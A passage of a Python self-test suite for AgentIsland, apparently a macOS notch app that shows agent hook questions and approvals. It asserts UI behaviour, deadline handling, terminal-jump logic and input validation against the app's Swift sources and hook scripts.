# The question outlives its card: a click elsewhere used to dismiss the card and, with it,
# the only route back to answering. Nothing about the hook's lifetime depends on the card
# any more, so dismissing is now purely cosmetic.
check("the question outlives its card",
      "func holdQuestion" in _is7 and "heldQuestion" in _is7)
check("dismissing a card does not end the question",
      "releaseQuestion" not in _is7.split("func dismissQuestion")[1][:400])
check("answering releases it", "defer { releaseQuestion(question.id) }" in _is7)
check("expiry releases it", "self.releaseQuestion(q.id)" in _is7)
check("the approval hold is left alone",
      "private let hold = ApprovalHold()" in _is7)

# The island guessed how long the hook would wait, so it both withdrew the answer button early
# and offered one after nobody was left.
check("the hook publishes its own deadline", '"expires_at"' in _qh7)
check("the island uses it rather than guessing",
      'obj["expires_at"]' in _hs7 and "43 + 25 *" not in _hs7)

# A file still on disk means nobody read it.
check("an answer nobody collected is reported",
      "static func wasRead" in _ap7 and "answered too late" in _is7)

# A chord another app owns fails to register, which looked identical to a key doing nothing.
check("a hotkey that cannot register says so",
      "not available" in _hk7 and "err != noErr" in _hk7)
check("question navigation uses a chord terminals do not own",
      "cmdOptShift" in _is7 and "leftArrow" not in _is7)

# A card with no button reads as a card with nothing to do.
check("submit is always visible, and separate from next",
      'button("submit", filled: true, on: true' in _vw7
      and 'button("next", filled: false, on: answered' in _vw7)
# Dim, but never dead: pressing it early goes to the gap.
check("an incomplete submit is dimmed rather than disabled",
      ".opacity(allAnswered ? 1 : 0.55)" in _vw7)
check("and there is a way out to the chat",
      "answer in chat →" in _vw7 and "func handToChat" in _is7)

print("\n=== 23i. a question actually reaches the card ===")
_ph = open(os.path.join(REPO, "hooks/agentisland-permission.sh")).read()
_rh2 = open(os.path.join(REPO, "hooks/agentisland-rules.py")).read()
_is6 = open(os.path.join(REPO, "Sources/AgentIsland/Island.swift")).read()
_vw6 = open(os.path.join(REPO, "Sources/AgentIsland/Views.swift")).read()

# AskUserQuestion arrives as BOTH a PreToolUse and a PermissionRequest. The permission hook has
# no matcher, so both fired and the approval card won -- the question never appeared.
check("the permission hook leaves questions to the question card",
      '"AskUserQuestion"' in _ph and "exit 0 ;; esac" in _ph)
check("the guard tolerates either JSON spacing",
      """*'"tool_name"'*'"AskUserQuestion"'*""" in _ph)
check("a rule cannot allow or deny a question",
      'if tool == "AskUserQuestion":' in _rh2)

# Verified against a payload captured from a real ask.
_pj = "/tmp/qpayload.json"
if os.path.exists(_pj):
    _d = RUN + "-permq"
    os.makedirs(_d + "/dec", exist_ok=True)
    open(_d + "/alive", "w").close()
    for _style, _sep in (("compact", (",", ":")), ("spaced", (", ", ": "))):
        _sp = f"{_d}/{_style}.jsonl"
        subprocess.run([os.path.join(REPO, "hooks/agentisland-permission.sh")],
            input=json.dumps(json.load(open(_pj)), separators=_sep), capture_output=True,
            text=True, timeout=20,
            env=dict(os.environ, AGENTISLAND_SPOOL=_sp, AGENTISLAND_DECISIONS=_d + "/dec",
                     AGENTISLAND_ALIVE=_d + "/alive", AGENTISLAND_TIMEOUT_TENTHS="20"))
        check(f"a real question is not claimed as a permission ({_style})",
              not os.path.exists(_sp) or not open(_sp).read().strip())

# Reading four questions before answering any should not require knowing a chord exists.
check("questions can be reached by clicking a pip",
      "onStep(i)" in _vw6 and "func goToStep" in _is6)
check("and by keyboard", "Hotkeys.cmdOptShift" in _is6)
# The panel takes no focus, so a click elsewhere is the only dismissal a person will try.
check("a click outside closes the card",
      "addGlobalMonitorForEvents" in _is6 and "self.dismissQuestion()" in _is6)
check("the click monitor is always torn down",
      _is6.count("stopWatchingClicks()") >= 3)
# A card that timed out was unreachable unless you knew the row would bring it back.
check("a waiting row offers a visible way back in",
      "onAnswer" in _vw6 and "questionmark.bubble.fill" in _vw6)

print("\n=== 23g. hostile spool and decision files ===")
_ap4 = open(os.path.join(REPO, "Sources/AgentIsland/Approvals.swift")).read()
_hs4 = open(os.path.join(REPO, "Sources/AgentIsland/HookStream.swift")).read()
_as4 = open(os.path.join(REPO, "Sources/AgentIsland/AgentStore.swift")).read()
_is4 = open(os.path.join(REPO, "Sources/AgentIsland/Island.swift")).read()
_qh4 = open(os.path.join(REPO, "hooks/agentisland-question.py")).read()
_sh4 = open(os.path.join(REPO, "hooks/agentisland-hook.sh")).read()

# Ids arrive off a shared-/tmp spool and become filenames; without a check a crafted line
# aims a write anywhere the user can reach.
check("request ids are validated before becoming paths", "static func validID" in _ap4
      and "guard validID(question.id)" in _ap4 and "guard validID(approval.id)" in _ap4)
check("a bad id is rejected at the spool, not just at the write",
      "Approvals.validID(qid)" in _hs4 and "Approvals.validID(reqID)" in _hs4)
check("a session id cannot traverse out of the transcript directory",
      "guard Approvals.validID(sessionId) else { return nil }" in _as4)
# Payloads and answers pass through /tmp, which is shared.
check("hooks do not publish payloads to every account", "umask 077" in _sh4
      and "os.umask(0o077)" in _qh4)
check("the decisions directory is private", "mode=0o700" in _qh4)
# An upgrade inherits the old build's mode, so creation-time alone is not enough.
check("an inherited spool is tightened on every start",
      'setAttributes([.posixPermissions: 0o600], ofItemAtPath: Self.spool)' in _hs4)

# The queue handed the next card to a presenter that saw the old one still on screen.
check("a queued card is shown, not re-queued",
      "if !queuedQuestions.isEmpty || !queuedApprovals.isEmpty { state = .collapsed }" in _is4)
# An ask whose questions share wording cannot be answered by a map keyed on wording.
check("an answer that cannot be written does not close the card",
      "guard Approvals.answer(question, picks: picks, typed: typed) else {" in _is4
      and "@discardableResult" in _ap4)
check("an empty ask cannot subscript out of range",
      "guard !q.items.isEmpty else { return nil }" in _is4)
check("the answer-so-far survives a close and reopen",
      "if answeringId != question.id {" in _is4 and "private var answeringId: String?" in _is4)
check("keys rebind to the step actually on screen",
      "bindKeys(question, step: questionStep)" in _is4)

print("\n=== 23f. question cards ===")
_qh2 = open(os.path.join(REPO, "hooks/agentisland-question.py")).read()
_hs3 = open(os.path.join(REPO, "Sources/AgentIsland/HookStream.swift")).read()
_vw3 = open(os.path.join(REPO, "Sources/AgentIsland/Views.swift")).read()
_is3 = open(os.path.join(REPO, "Sources/AgentIsland/Island.swift")).read()
_ap3 = open(os.path.join(REPO, "Sources/AgentIsland/Approvals.swift")).read()

# 21% of real asks carry more than one question, and the hook used to refuse all of them.
check("a multi-question ask is no longer refused", "if len(questions) != 1" not in _qh2)
check("every question is forwarded or none is", "len(items) != len(questions)" in _qh2)
# Every option in every measured ask carries a description; labels alone are words without argument.
check("options carry their reasoning", '"description": o.get("description"' in _qh2
      and "let detail: String" in _hs3)
check("options carry their preview", '"preview": o.get("preview"' in _qh2)
check("the card renders the reasoning", "opt.detail" in _vw3)
check("the card renders a preview beside the options", "focused?.preview" in _vw3)

# An answer must be exactly what was asked, in the shape each question allows.
check("answers are rebuilt, never passed through", "answers = {}" in _qh2
      and 'updated["answers"] = answers' in _qh2)
check("multiSelect shape is enforced both ways",
      'if item["multi"]:' in _qh2 and "isinstance(want, list) or not want" in _qh2
      and "return w if w in labels else None" in _qh2)
check("a repeated pick cannot be sent twice", "w not in want[:i]" in _qh2)
check("the island writes one answer for the whole ask", "func answer(_ question: Question, picks:" in _ap3)
check("an incomplete sequence is never submitted", "body.count == question.items.count" in _ap3)

# A fixed height truncated the question; the window and the view must agree on the new one.
check("the card is sized by its content", "func cardHeight(width:" in _hs3)
check("window and view size from one accessor",
      _is3.count("island.questionSize(q)") == 2 and "func questionSize" in _is3)
check("the card cannot outgrow the screen", "0.62" in _is3)
check("number keys reset per question", "func bindKeys" in _is3 and "step: Int" in _is3)

print("\n=== 24. tool call timeline ===")
_tv = open(os.path.join(REPO, "Sources/AgentIsland/Views.swift")).read()
_tc = open(os.path.join(REPO, "Sources/AgentIsland/ToolCalls.swift")).read()

# The whole feature is affordable only because it is lazy: a refresh must never parse calls.
_store = open(os.path.join(REPO, "Sources/AgentIsland/AgentStore.swift")).read()
check("no refresh path parses tool calls", "ToolCalls.recent" not in _store)
# Parsed calls outlive the row that asked for them unless refresh evicts them.
check("parsed calls are evicted with their session",
      "ToolCalls.retain(ids)" in _store and "static func retain" in _tc)
check("tool calls are parsed only from the row toggle",
      _tv.count("ToolCalls.recent") == 1 and "private func toggle" in _tv)
check("the parse runs off the main thread",
      "DispatchQueue.global(qos: .userInitiated).async" in _tv.split("private func toggle")[1][:600])
check("a row closed mid-read discards the result",
      "guard openRow == id else { return }" in _tv)
check("parsed calls are cached by mtime", "hit.mtime == mtime" in _tc)

# Clicking a row must still jump: expansion is a separate, smaller target.
check("the chevron has its own hit target, leaving the row's tap alone",
      ".onTapGesture(perform: onToggle)" in _tv and "onTapGesture { if row.canJump { onJump() } }" in _tv)
check("only one row can be open at a time", "@State private var openRow: String?" in _tv)
check("a collapsed row keeps the height it has today",
      "guard expanded else { return height }" in _tv)
# A fixed cell clipped the evidence line off every call that had one, so height is summed
# from each call's own line count rather than assumed.
check("an expanded row's height is summed from what each call draws",
      "calls.reduce(0) { $0 + $1.lines }" in _tv
      and "CGFloat(c.lines) * AgentRowView.callLine" in _tv)
check("a collapsed row keeps its centring",
      "alignment: expanded ? .top : .center" in _tv)

# The design's core rule: intent is the headline, output is evidence.
check("the why is rendered brightest", "foregroundColor(c.isError ? Theme.failed : Theme.text)" in _tv)
# The list is newest-first, so a bare time on the right reads as age when it is duration —
# correct ordering looked broken because of it.
check("a call's duration is marked as a duration",
      'Image(systemName: "timer")' in _tv)
check("the response is rendered faint",
      "Theme.failed.opacity(0.75) : Theme.faint" in _tv)
check("no new colours were invented for the timeline",
      not re.search(r'timeline[\s\S]{0,1800}Color\(red:', _tv))
check("a subagent call is visually distinct",
      "c.isAgent ? Theme.waiting : Theme.agentTint" in _tv)

# Output is frequently minified source or a binary scan; it must never be unbounded.
check("a response preview is hard-bounded", 't.count > 120 ? String(t.prefix(120))' in _tc)
check("the read window is bounded regardless of file size",
      "window: UInt64 = 2 * 1024 * 1024" in _tc)

check("blocking cards still name something human",
      _is.count('?? "agent"') >= 4)



for name,p in [("claude","~/.claude/settings.json"),("codex","~/.codex/hooks.json")]:
    fp=os.path.expanduser(p)
    if os.path.exists(fp):
        c=json.load(open(fp))
        theirs=sum(1 for ev in c.get("hooks",{}).values() for e in ev
                   for h in e.get("hooks",[]) if "agentisland" not in json.dumps(h))
        check(f"{name}: other tools' hooks survived install", theirs>0, f"{theirs} preserved")

print("\n=== 19. cache bounds (soak safety) ===")
_st=open(f"{src}/AgentStore.swift").read()
for name in ("ProcEnv.retain","Cwd.retain","Transcript.retain","Titles.retain"):
    check(f"{name} is called each refresh", name in _st)
check("codex rollout cache is trimmed",
      "trimCache(keeping" in open(f"{src}/CodexSource.swift").read())
_cwd=open(f"{src}/Cwd.swift").read()
check("cwd comes from a syscall, not an lsof spawn", "Proc.cwd(pid:" in _cwd)
check("cwd misses are recorded so they are not retried",
      'Proc.cwd(pid: pid) ?? ""' in open(os.path.join(REPO,"Sources/AgentIsland/Cwd.swift")).read())
_cx=open(f"{src}/CodexSource.swift").read()
check("codex liveness is an exact comm match in-process", 'Proc.pids(comm: "codex")' in _cx)

print("\n=== 20. honest degradation ===")
host=open(f"{src}/HostTerminal.swift").read()
check("a capable host with no handle degrades rather than guessing", "case degraded" in host)
check("degraded jump deliberately does nothing", "Deliberately does nothing" in host)
check("every vendor has a resume path", "codex resume" in open(f"{src}/Reopen.swift").read())

print("\n=== 21. notification noise ===")
hs=open(os.path.join(REPO,"Sources/AgentIsland/HookStream.swift")).read()
check("idle_prompt is not treated as an ask", "idle_prompt" in hs)
check("only real asks set waiting", 'kind == "idle_prompt"' in hs)
seen=set()
if os.path.exists(LIVE_SPOOL):
    for l in open(LIVE_SPOOL):
        if '"notification_type"' in l:
            try: seen.add(json.loads(l).get("payload",json.loads(l)).get("notification_type"))
            except Exception: pass
check("idle_prompt observed in the wild (the noisy one)",
      "idle_prompt" in seen or not seen,   # a spool with no notifications yet proves nothing
      str(sorted(x for x in seen if x)))

print("\n=== 22. first-click reliability ===")
isl=open(os.path.join(REPO,"Sources/AgentIsland/Island.swift")).read()
check("hosting view accepts first mouse (panel is never key)",
      "acceptsFirstMouse" in isl and "FirstMouseHostingView" in isl)
check("the panel uses that hosting view", "FirstMouseHostingView(rootView:" in isl)
check("hit region refreshes on state change, not only on poll",
      isl.count("refreshHitRegion()") >= 4)
check("poll is a backstop, not the primary path",
      "state == .collapsed ? 0.75 : 0.06" in isl)

print("\n=== 23. adversarial input and concurrency ===")
# These run as their own suites because they are slow and destructive; assert they exist and
# that the guards they proved are still in the source.
for name in ("fuzz-hooks.py", "concurrency.py", "soak.py", "purge-synthetic.py", "terminals-e2e.py"):
    check(f"tests/{name} present", os.path.exists(os.path.join(REPO, "tests", name)))

# Per-terminal jump correctness. Warp resolves a focus URL; iTerm2 and Terminal need the exact
# handle the app matches on, and both were silently wrong before: iTerm2 matched the full
# "wNtNpN:UUID" env string against the bare-UUID scripting id, and Terminal matched a UUID
# against a tty. Assert the shipped logic uses the right handle for each.
_ht = open(os.path.join(REPO, "Sources/AgentIsland/HostTerminal.swift")).read()
_pe = open(os.path.join(REPO, "Sources/AgentIsland/ProcEnv.swift")).read()
_pr = open(os.path.join(REPO, "Sources/AgentIsland/Proc.swift")).read()
check("iTerm2 jump matches the UUID after the pane prefix, not the whole env string",
      'ITERM_SESSION_ID is "wNtNpN:UUID"' in _ht
      and 'let sid = Self.appleSafe(session.split(separator: ":").last' in _ht)
check("Terminal jump matches on the controlling tty, not TERM_SESSION_ID",
      "`session` is the controlling tty" in _ht and "tty of t contains" in _ht)
check("resolve carries Terminal's tty, degrading when it has none",
      "return .appleTerminal(session: tty)" in _ht and 'name: "Terminal"' in _ht)
check("iTerm2 is claimed before Terminal, since iTerm2 also sets TERM_SESSION_ID",
      _ht.index("i.itermSession") < _ht.index('i.termProgram == "Apple_Terminal"'))
check("a handle from a process env is sanitised before entering AppleScript",
      "static func appleSafe" in _ht
      and "appleSafe(session" in _ht)
check("the controlling tty is read by syscall, not a spawn",
      "PROC_PIDTBSDINFO" in _pr and "devname(dev_t" in _pr and "static func tty(pid:" in _pr)
check("the tty is captured per process during priming", "i.tty = Proc.tty(pid: pid)" in _pe)

print("\n=== 28. the console: read an agent's output from the notch ===")
_cs = open(os.path.join(REPO, "Sources/AgentIsland/Console.swift")).read()
_cv = open(os.path.join(REPO, "Sources/AgentIsland/ConsoleView.swift")).read()
_isc = open(os.path.join(REPO, "Sources/AgentIsland/Island.swift")).read()
_hk = open(os.path.join(REPO, "Sources/AgentIsland/Hotkeys.swift")).read()

# Only the tail is ever read, so a 198MB transcript costs the same as a small one.
check("the console reads a bounded tail, not the file",
      "window: UInt64 = 512 * 1024" in _cs and "Tail.read(path: path, bytes: window)" in _cs)
check("and caches until the transcript changes", "hit.mtime == mtime" in _cs)
check("parsing never runs on the main actor",
      "DispatchQueue.global(qos: .userInitiated)" in _cv and "await withCheckedContinuation" in _cv)
check("tool output is deliberately not shown",
      "output is not shown" in _cs and "case ran(tool: String, why: String" in _cs)
check("the newest line is the one you land on", 'proxy.scrollTo("end", anchor: .bottom)' in _cv)
check("the console scrolls", "ScrollView {" in _cv and "LazyVStack" in _cv)
check("prose renders as markdown, reusing the plan reader",
      "MarkdownLite(text: text, style: .reading)" in _cv)
# Monospaced grey prose at 10.5 reads as a wall; plans stay dense, the console reads.
check("prose is proportional and brighter than a plan's",
      "case compact, reading" in open(os.path.join(REPO, "Sources/AgentIsland/PanelModes.swift")).read()
      and "Theme.name(11.5)" in open(os.path.join(REPO, "Sources/AgentIsland/PanelModes.swift")).read())
check("the plan reader keeps its dense style", "var style: Style = .compact" in
      open(os.path.join(REPO, "Sources/AgentIsland/PanelModes.swift")).read())
check("consecutive tool calls collapse into one aside", "static func group(" in _cs)
check("and prose carries the time it was said", "private func stamp(" in _cv)

# It is a reader. The panel must never take the cursor out of the editor behind it.
check("the console never makes the panel key",
      "keyable = true" not in _isc.split("func openConsole")[1].split("func closeConsole")[0])
# A bare Escape registered through Carbon is global: it was swallowed system-wide while the
# console was up, so Esc never reached the editor behind it.
check("escape is not stolen from the app behind the console", "kVK_Escape" not in _isc)
check("and the console advertises the chord that does close it",
      'tag("\u2318\u2325K"' in open(os.path.join(REPO, "Sources/AgentIsland/ConsoleView.swift")).read())
check("clicking away closes it", "case .console:  DispatchQueue.main.async { self.closeConsole() }" in _isc)
check("the summon chord outlives the cards that bind their own keys",
      "func bindLasting" in _hk and "actions.filter { $0.key >= Self.lastingBase }" in _hk)
check("a row offers a way in", "var onConsole" in
      open(os.path.join(REPO, "Sources/AgentIsland/Views.swift")).read())

# Behavioural: parse a real transcript through the shipped binary.
_bin = os.path.join(REPO, ".build/debug/AgentIsland")
_tx = sorted(_g.glob(os.path.expanduser("~/.claude/projects/*/*.jsonl")),
             key=os.path.getsize, reverse=True)[:1]
if os.path.exists(_bin) and _tx:
    _sid = os.path.basename(_tx[0])[:-6]
    _r = subprocess.run([_bin, "--console", _sid], capture_output=True, text=True, timeout=60)
    _first = _r.stdout.splitlines()[0] if _r.stdout else ""
    _m = re.match(r"(\d+) entries \((\d+) said, (\d+) ran\) in ([\d.]+) ms", _first)
    check("the console parses a real transcript", bool(_m), _first[:60])
    if _m:
        check("it finds both prose and tool calls", int(_m.group(2)) > 0 and int(_m.group(3)) > 0,
              f"{_m.group(2)} said / {_m.group(3)} ran")
        check("on a multi-hundred-MB transcript, in well under a second",
              float(_m.group(4)) < 500, f"{_m.group(4)} ms on {os.path.getsize(_tx[0])//10**6} MB")
        check("and in the order it happened", "chronological: yes" in _r.stdout)
# Notifications must come from the app's own channel, never osascript `display notification`,
# which macOS brands as "Script Editor" — a stray, wrong-looking alert.
_nt = open(os.path.join(REPO, "Sources/AgentIsland/Notifier.swift")).read()
check("notifications never shell out to osascript",
      "Process()" not in _nt and 'URL(fileURLWithPath: "/usr/bin/osascript")' not in _nt)
check("notifications post only when the app itself is authorized",
      "getNotificationSettings" in _nt and "authorizationStatus == .authorized" in _nt)
# Opening iTerm2/Terminal from a Warp tab leaks WARP_FOCUS_URL into it; keying on that handle
# first sent the jump to Warp. A real TERM_PROGRAM must win over a leaked Warp handle.
check("a genuine iTerm2 TERM_PROGRAM beats a leaked Warp handle",
      _ht.index('i.termProgram == "iTerm.app"') < _ht.index("if let u = i.focusURL"))
check("a genuine Terminal TERM_PROGRAM beats a leaked Warp handle",
      _ht.index('i.termProgram == "Apple_Terminal"') < _ht.index("if let u = i.focusURL"))
# Host resolution reads only the process env, so it is identical for every vendor — proving it
# for a Claude process in iTerm2 proves it for Codex and Cursor there too.
check("host resolution is vendor-independent (takes a pid, not a vendor)",
      "static func resolve(pid: Int)" in _ht and "vendor" not in _ht.split("static func resolve(pid: Int)")[1].split("return")[0])
_q=open(os.path.join(REPO,"hooks/agentisland-question.py")).read()
_r=open(os.path.join(REPO,"hooks/agentisland-rules.py")).read()
check("question hook guards non-object JSON", "isinstance(payload, dict)" in _q)
check("question hook guards non-list questions", "isinstance(questions, list)" in _q)
check("rules hook guards non-object JSON", "isinstance(payload, dict)" in _r)
_b=open(os.path.join(REPO,"tests/benchmark.py")).read()
check("benchmark writes to its own spool by default", "agentisland-bench.jsonl" in _b)

print("\n=== 25. typing an answer, and never submitting one by itself ===")
# The reader asked for the manual input Claude's own picker offers. It has to cross the same
# gate as a label without widening it: a mistyped label must still be refused.
_ta = f"{RUN}-tyalive"
open(_ta, "w").write("1")

TQ = json.dumps({"session_id": "selftest", "hook_event_name": "PreToolUse",
                 "tool_name": "AskUserQuestion", "tool_input": {"questions": [
    {"question": "Which DB?", "header": "DB", "multiSelect": False,
     "options": [{"label": "Postgres", "description": "r"}, {"label": "MongoDB", "description": "d"}]},
    {"question": "Which caches?", "header": "Cache", "multiSelect": True,
     "options": [{"label": "Redis", "description": "r"}, {"label": "Memcached", "description": "m"}]}]}})

def _ask(decision, timeout="12"):
    """Run the hook, answer it with `decision`, return the parsed answers or None."""
    d, sp = f"{RUN}-ty{abs(hash(repr(decision))) % 99999}", None
    sp = d + ".jsonl"
    os.makedirs(d, exist_ok=True)
    for f in os.listdir(d): os.remove(os.path.join(d, f))
    if os.path.exists(sp): os.remove(sp)
    box = {}
    def go():
        box["r"] = subprocess.run([qh], input=TQ, capture_output=True, text=True, timeout=25,
            env=dict(os.environ, AGENTISLAND_ALIVE=_ta, AGENTISLAND_Q_TIMEOUT=timeout,
                     AGENTISLAND_SPOOL=sp, AGENTISLAND_DECISIONS=d))
    t = threading.Thread(target=go); t.start()
    for _ in range(60):
        if os.path.exists(sp) and open(sp).read().strip(): break
        time.sleep(0.2)
    qid = json.loads(open(sp).readline())["ap_question_id"]
    open(os.path.join(d, qid), "w").write(json.dumps(decision))
    t.join()
    try: return json.loads(box["r"].stdout)["hookSpecificOutput"]["updatedInput"]["answers"]
    except Exception: return None

a = _ask({"Which DB?": {"other": "DuckDB, actually"}, "Which caches?": ["Redis"]})
check("typed text answers a single-choice question", a == {"Which DB?": "DuckDB, actually",
                                                           "Which caches?": ["Redis"]})

a = _ask({"Which DB?": "MongoDB", "Which caches?": ["Redis", {"other": "Hazelcast"}]})
check("typed text joins the labels on a multi-select",
      a == {"Which DB?": "MongoDB", "Which caches?": ["Redis", "Hazelcast"]})

# Marking is what keeps the label path strict: a bare string is still checked against the
# options, so a typo can never arrive as if it had been offered.
a = _ask({"Which DB?": "DuckDB", "Which caches?": ["Redis"]})
check("an unmarked string is still refused", a is None)
a = _ask({"Which DB?": {"other": "x", "extra": 1}, "Which caches?": ["Redis"]})
check("a dict that is not a typed answer is refused", a is None)
a = _ask({"Which DB?": {"other": 42}, "Which caches?": ["Redis"]})
check("a non-string typed answer is refused", a is None)

# Typed text is the one field a person composes freely, so it is bounded and flattened
# rather than trusted to be one tidy line.
a = _ask({"Which DB?": {"other": "line\nbreak\ttab\x07bell"}, "Which caches?": ["Redis"]})
check("control characters are stripped from typed text",
      a is not None and a["Which DB?"] == "linebreaktabbell")
a = _ask({"Which DB?": {"other": "z" * 5000}, "Which caches?": ["Redis"]})
check("typed text is capped", a is not None and len(a["Which DB?"]) == 2000)
a = _ask({"Which DB?": {"other": "   "}, "Which caches?": ["Redis"]})
check("whitespace is not an answer", a is None)

_is5 = open(os.path.join(REPO, "Sources/AgentIsland/Island.swift")).read()
_vw5 = open(os.path.join(REPO, "Sources/AgentIsland/Views.swift")).read()
_ap5 = open(os.path.join(REPO, "Sources/AgentIsland/Approvals.swift")).read()
_hs5 = open(os.path.join(REPO, "Sources/AgentIsland/HookStream.swift")).read()

# Answering the fourth question used to send the ask and close the card under the click.
check("moving past the last question never submits",
      "guard step + 1 < question.items.count else { return }" in _is5
      and "choose(question, picks: picks)" not in _is5.split("func advance")[1].split("func isAnswered")[0])
check("submit is the only path that commits",
      "func submit(_ question: Question)" in _is5
      and "endTyping()\n        choose(question, picks: picks)" in _is5)
check("a partial ask cannot be submitted", "q.items.allSatisfy(isAnswered)" in _is5)
check("either a pick or typed text counts as answered",
      "!(picks[item.text] ?? []).isEmpty" in _is5 and '!(typed[item.text] ?? "")' in _is5)
check("the submit button is always drawn", 'button("submit", filled: true, on: true' in _vw5)

# Typing needs key focus, which this panel refuses so that clicking an option cannot pull
# focus out of the editor behind it. It is taken for the field and handed straight back.
check("the panel takes focus only for the field",
      "var keyable = false" in _is5 and "override var canBecomeKey: Bool { keyable }" in _is5)
check("focus is released again", "NSApp.deactivate()" in _is5 and "func endTyping()" in _is5)
check("a new card starts with no typed text", "picks = [:]; typed = [:]" in _is5)
check("leaving the card drops the field",
      "endTyping()" in _is5.split("func dismissQuestion")[1].split("func pick")[0])

check("typed text is marked on the way out", '["other": free]' in _ap5)
check("the free-text row is measured into the card", "the free-text row" in _hs5)
check("the reader is told the dots are the way across", "click a dot to jump" in _vw5)

# Typing then finding the ask still pending read as a lost answer. Nothing was lost — the
# card just showed position where it needed to show what was answered.
check("return moves on, and on the last question that means submitting",
      ".onSubmit { isLast ? onSubmit() : onConfirm() }" in _vw5)
check("leaving a question closes its field",
      "endTyping()" in _is5.split("func goToStep")[1].split("func holdQuestion")[0])
check("a pip shows what is answered, not where you are",
      "done(i) ? Theme.working : Theme.faint" in _vw5)
check("typed text counts towards a pip too", '!(typed[q.text] ?? "")' in _vw5)
check("an inert submit says how many are left", "of \\(question.items.count) answered" in _vw5)
check("that count is not shown on a single question",
      "if question.items.count > 1 {\n                Text(\"\\(doneCount)" in _vw5)
check("the field says what return will do", "⏎ for the next question" in _vw5)
# Return was a dead key on the last question, under a footer telling the reader to press
# submit. Moving on from the last question means submitting.
check("return submits on the last question",
      ".onSubmit { isLast ? onSubmit() : onConfirm() }" in _vw5)
check("an incomplete submit goes to the gap instead of nothing",
      "question.items.firstIndex(where: { !isAnswered($0) })" in _is5)

print("\n=== 26. the deadline the harness actually enforces ===")
# Claude Code SIGKILLs a hook at the timeout in settings.json, whatever the hook believes.
# It was 60s while the hook waited up to 300, so every answer given after a minute was
# written to disk and never read — the "I answered and it ignored me" bug, three times over.
_ih = open(os.path.join(REPO, "scripts/install-hooks.py")).read()
_qh6 = open(os.path.join(REPO, "hooks/agentisland-question.py")).read()
_harness = int(re.search(r'"matcher": "AskUserQuestion", "timeout": (\d+)', _ih).group(1))
_hard = int(float(re.search(r'AGENTISLAND_Q_TIMEOUT", "(\d+)', _qh6).group(1)))
check("the harness lets the hook outlive its own window",
      _harness > _hard, f"harness {_harness}s > window {_hard}s")

# The window used to be 45s flat, extended only while the island kept re-touching a per-card
# heartbeat. A Timer in the default run-loop mode stops while AppKit tracks the mouse — i.e.
# while the card is being used — so one missed 10s window killed the hook mid-answer.
check("the wait no longer depends on a per-card heartbeat",
      "_held" not in _qh6 and ".hold" not in _qh6)
check("it slides the deadline on each interaction, capped by the window",
      "if now - started >= WINDOW:" in _qh6 and "last = os.path.getmtime(touched)" in _qh6)
check("and stands down only if the app itself goes away",
      "if not _island_alive():" in _qh6)
check("the island stopped writing a per-card heartbeat",
      "questionHold" not in open(os.path.join(REPO, "Sources/AgentIsland/Island.swift")).read())

print("\n=== 27. untouched cards fall through, touched ones wait ===")
_ph = os.path.join(REPO, "hooks/agentisland-permission.sh")

def _grace(touch, grace="2", window="30"):
    """Run the question hook; optionally mark the card touched. Returns (seconds, answered)."""
    d = f"{RUN}-gr{int(touch)}"
    sp = d + ".jsonl"
    os.makedirs(d, exist_ok=True)
    for f in os.listdir(d): os.remove(os.path.join(d, f))
    if os.path.exists(sp): os.remove(sp)
    box = {"beat": True}
    def go():
        t0 = time.time()
        box["r"] = subprocess.run([qh], input=QREQ, capture_output=True, text=True, timeout=60,
            env=dict(os.environ, AGENTISLAND_ALIVE=_ta, AGENTISLAND_Q_TIMEOUT=window,
                     AGENTISLAND_Q_GRACE=grace, AGENTISLAND_SPOOL=sp, AGENTISLAND_DECISIONS=d))
        box["took"] = time.time() - t0
    def beat():                                          # the running app refreshes this
        while box["beat"]:
            open(_ta, "w").write("1"); time.sleep(0.5)
    threading.Thread(target=beat, daemon=True).start()
    t = threading.Thread(target=go); t.start()
    for _ in range(60):
        if os.path.exists(sp) and open(sp).read().strip(): break
        time.sleep(0.2)
    qid = json.loads(open(sp).readline())["ap_question_id"]
    if touch:
        tp = os.path.join(d, qid + ".touched")
        # Keep interacting: each re-stamp slides the deadline, so the card outlives the base
        # grace as long as the user is engaged.
        for _ in range(4):
            open(tp, "w").close(); os.utime(tp, None)
            time.sleep(1)                               # < grace, so it never falls through
        open(os.path.join(d, qid), "w").write(json.dumps({"Which DB?": "MongoDB"}))
    t.join()
    box["beat"] = False
    got = None
    try: got = json.loads(box["r"].stdout)["hookSpecificOutput"]["updatedInput"]["answers"]
    except Exception: pass
    return box["took"], got

_t, _a = _grace(touch=False)
check("an untouched card falls through at the grace, not the window",
      1.5 < _t < 6 and _a is None, f"{_t:.1f}s")
_t, _a = _grace(touch=True)
check("a card kept touched slides past the base grace and is answered",
      _t > 3.5 and _a == {"Which DB?": "MongoDB"}, f"{_t:.1f}s")

# The mark slides on interaction; the invariant is that only real input re-stamps it.
_qh8 = open(os.path.join(REPO, "hooks/agentisland-question.py")).read()
_ps8 = open(_ph).read()
# Sliding means the hook DOES read the mark's age, but the mark is re-stamped by real input
# (markInteraction), never by a repeating timer — the timer version stalled under mouse
# tracking, which is exactly when the card was in use.
check("the question hook slides on the mark's age",
      "os.path.getmtime(touched)" in _qh8 and ".touched" in _qh8)
# The collapsed bar drew at its wide hover width at rest whenever a question or peek arrived
# while the pointer was on the notch: the hover-exit cleared `revealed` only when still
# collapsed, so a card landing mid-hover stranded it true until a fresh hover cycle.
_isv = open(os.path.join(REPO, "Sources/AgentIsland/Island.swift")).read()
_exit = _isv.split("sensor.onExit")[1].split("}")[0] if "sensor.onExit" in _isv else ""
check("hover-exit clears the reveal even if a card took the notch",
      "guard self.state == .collapsed else { return }" not in
      _isv.split("sensor.onExit")[1].split("self.revealed = false")[0])
check("and it still clears the reveal", "self.revealed = false" in _isv)

check("only interaction re-stamps the mark, never a background timer",
      "func markInteraction" in _is5
      and "Timer.scheduledTimer" not in open(os.path.join(REPO, "Sources/AgentIsland/ApprovalContext.swift")).read())
check("the approval hook never checks the mark's age",
      "hold" not in _ps8 and "$DECISIONS/$id.touched" in _ps8)
check("nothing refreshes a mark", "setAttributes([.modificationDate" not in
      open(os.path.join(REPO, "Sources/AgentIsland/ApprovalContext.swift")).read())
check("every interaction slides the grace",
      _is5.count("markInteraction(") >= 4 and "func markInteraction" in _is5
      and "static func touch(" in _ap5)

# A question that moved to the chat stays readable in the notch instead of vanishing.
check("a handed-over question stays on screen as a copy",
      "@Published var handedOver: Set<String> = []" in _is5
      and "handedOver.insert(q.id)" in _is5)
check("the copy cannot be answered",
      "if !handedOver { onPick(opt.label) }" in _vw5 and "if !handedOver { other }" in _vw5)
check("and it says where the question went",
